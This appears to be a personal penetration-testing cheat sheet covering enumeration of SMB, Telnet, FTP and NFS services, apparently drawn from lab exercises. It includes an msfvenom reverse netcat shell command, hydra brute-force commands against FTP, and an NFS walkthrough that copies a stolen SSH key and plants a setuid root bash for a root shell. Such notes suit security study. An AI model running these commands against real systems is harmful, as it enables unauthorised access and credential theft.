# Enumeration-Techniques
## SMB Enumeration
**1. Scan the network and find out port with** : `nmap -sV -p <port> <ip>` **(default port 445)**\
**2. After that enumerate smb server with Enum4linux** : `enum4linux [options] <ip>`
<details>
  <h3>Basic enum4linux flags</h3>
  <summary>options</summary>
  <p>-U  get userlist</p>
  <p>-M  get machine list</p>
  <p>-N   get namelist dump (different from -U and-M)</p>
  <p>-S  get sharelist</p>
  <p>-P  get password policy information</p>
  <p>-G  get group and member list</p>
  <p>-a  all of the above (full basic enumeration)</p>
</details>

### Other Enumeration Techniques (unix)
  `nmap -v -p 139,445 -oG smb.txt <ip range>` \
  `nbt scan -r <ip/range>`\
  `nmap -v -p 139,445 –script smb-os-discovery <ip>`
  
**Extra** `smbclient //IP/SHARE` **(for connecting)**

  
### On Windows
  `Net view \\dc01 /all`


## Telnet Enumeration
**1. Scan the network to identify the port (default 23)** : `nmap -sV -p- <ip>` **(scan all ports)** \
**Can use `--stats-every 5s` for checking progress in nmap if you're impatient like me. ;)**\
**Extra** : `sudo tcpdump ip proto \\icmp -i tun0` **use this for starting a tcpdump listner to identify any kind of backdoor etc.**

<h3>Reverse Shell using netcat</h3>

**MSFVenom payload generate** : `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`


## FTP Enumeration
**1. Scan the network like always (use nmap my choice)**\
**2. Try default username & password combinations** [Seclists FTP Default Credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)\
**3. Bruteforce username and passwords using hydra**

**Usage** : `hydra -l <username> -P passwordslist.txt ftp://<ip>`\
**Usage** : `hydra -L usernames.txt -P passwordlist.txt ftp://<ip>:port`

## NFS Enumeration
**1. Scanning target all ports with nmap (agressive scan use with cation)** : `nmap -A -p- <target ip> --stats-every 5s`\
**2. Create a mount point to access shared folder** : `mkdir -p /tmp/mount`\
**3. Listing NFS share** : `/usr/sbin/showmount -e <ip>`\
**4. Mount into your system** : `sudo mount -t nfs IP:share /tmp/mount/ -nolock`

<details>
  <summary>Privilege Escalation</summary>
  
1. Go to mount point here mine is `/tmp/mount` and the shared folder was `cappucino` enter the folder
2. Search for `.ssh/id_rsa` copy that to your system and login using user\
Extra : **Download NFS files using scp** : `scp -i id_rsa username@<target ip>:/bin/bash ~/Downloads/bash`
3. **Download manually** : [bash](https://raw.githubusercontent.com/polo-sec/writing/refs/heads/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
4. On another tab go to /tmp/mount/cappucino on attacker machine and copy the bash shell downloaded previous line [bash](https://raw.githubusercontent.com/polo-sec/writing/refs/heads/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
5. change the bash file ownership to root using : `sudo chown root bash`
6. Give the bash shell special and executable privilege with : `sudo chmod +xs bash`
7. Login to ssh with the user and check for the bash file you've put just now and execute using : `./bash -p`
8. Bam !! You got the root shell 😅 ?
</details>


